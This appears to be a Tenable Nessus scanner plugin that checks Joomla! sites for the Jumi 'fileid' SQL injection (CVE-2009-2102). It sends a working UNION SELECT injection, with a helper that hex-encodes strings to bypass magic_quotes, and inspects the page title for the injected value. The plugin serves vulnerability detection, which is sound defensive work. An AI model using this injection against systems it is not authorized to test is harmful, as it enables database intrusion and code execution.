#
# (C) Tenable Network Security, Inc.
#


if (NASL_LEVEL < 3000) exit(1);


include("compat.inc");


if (description)
{
  script_id(42819);
  script_version("$Revision: 1.1 $");

  script_cve_id("CVE-2009-2102");
  script_bugtraq_id(35384);
  script_xref(name:"milw0rm", value:"8968");
  script_xref(name:"OSVDB", value:"55112");

  script_name(english:"Jumi Component for Joomla! fileid Parameter SQL Injection");
  script_summary(english:"Tries to execute a custom script");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is susceptible to
a SQL injection attack."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The remote host is running Jumi, a third-party component to include 
custom code into Joomla!.

The version of this component installed on the remote host fails to
sanitize input to the 'fileid' parameter in a GET request before 
using it in database queries.

Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated 
remote attacker can leverage this issue to manipulate SQL queries 
and, for example, uncover sensitive information from the 
application's database, read arbitrary files, or execute arbitrary 
PHP code."
  );
  script_set_attribute(attribute:"see_also", 
    value:"http://code.google.com/p/jumi/issues/detail?id=35"
  );
  script_set_attribute(attribute:"see_also", 
    value:"http://forum.joomla.org/viewtopic.php?p=1734587"
  );
  script_set_attribute(attribute:"solution", 
    value:"Upgrade to Jumi version 2.0.5 / 2.0.e / 2.1.beta3 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/06/15"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/06/16"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/11/16"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP scripts.");


# Test an install.
install = get_install_from_kb(appname:'joomla', port:port);
if (isnull(install)) exit(1, "Joomla wasn't detected on port "+port+".");
dir = install['dir'];


# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Make sure the component is installed.
url = string(dir, "/index.php?option=com_jumi");

res = http_send_recv3(port:port, method:"GET", item:url);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if ("The Jumi Application is Unpublished" >!< res[1]) 
  exit(0, "The Joomla install at "+build_url(port:port, qs:dir+"/")+" does not have the Jumi component installed.");


# Try to exploit the issue to manipulate the page title.
exploit = string("-", rand()%1000, "' UNION SELECT 2,", hexify(str:SCRIPT_NAME), ",null,null,null,0,0,1 -- '");

url = string(
  dir, "/index.php?",
  "option=com_jumi&",
  "fileid=", str_replace(find:" ", replace:"%20", string:exploit)
);

res = http_send_recv3(port:port, method:"GET", item:url);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# There's a problem if we can influence the page title.
if (string('<title>', SCRIPT_NAME, '</title>') >< res[2])
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus was able to verify the issue by manipulating the HTML title\n",
      "using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, "The Joomla install at "+build_url(port:port, qs:dir+"/")+" is not affected.");
